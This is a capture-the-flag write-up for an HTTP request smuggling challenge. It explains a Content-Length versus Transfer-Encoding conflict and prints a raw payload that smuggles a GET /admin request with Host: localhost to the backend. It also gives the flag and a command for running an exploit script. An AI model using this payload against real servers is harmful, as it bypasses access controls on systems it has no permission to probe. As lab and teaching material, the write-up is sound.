# Smuggler's Cove - Writeup

## Challenge
- Name: Smuggler's Cove
- URL: http://116.202.106.156:5007/
- Clue: "Two gatekeepers, one shipment, but they can't agree on what's inside"

## Vulnerability
The service is vulnerable to HTTP request smuggling caused by conflicting request framing headers:
- `Content-Length: 6`
- `Transfer-Encoding: chunked`

When two HTTP parsers disagree on which header to trust, one parser can treat extra bytes as a second request on the same connection.

## Exploitation Idea
1. Send a `POST /` request with both `Content-Length` and `Transfer-Encoding: chunked`.
2. End the chunked body with:
   - `0\r\n\r\n`
3. Immediately append another HTTP request in the same TCP stream:
   - `GET /admin HTTP/1.1`
   - `Host: localhost`
4. If frontend/backend parse differently, backend processes this appended request as a hidden second request.

## Payload Used
POST / HTTP/1.1
Host: 116.202.106.156:5007
Connection: keep-alive
Content-Length: 6
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Connection: close


## Result
The second backend response returned:
- `Admin Access! Flag: CIPH{smuggled_r3qu3st_succ3ssful_1337}`

## Flag
CIPH{smuggled_r3qu3st_succ3ssful_1337}

## Reproduce With Script
Use [smugglers_cove_exploit.py](smugglers_cove_exploit.py):

~~~bash
python smugglers_cove_exploit.py --target-host 116.202.106.156 --target-port 5007 --smuggled-path /admin --smuggled-host localhost
~~~

Expected important output includes:
- second response status `HTTP/1.1 200 OK`
- second response body containing the flag text
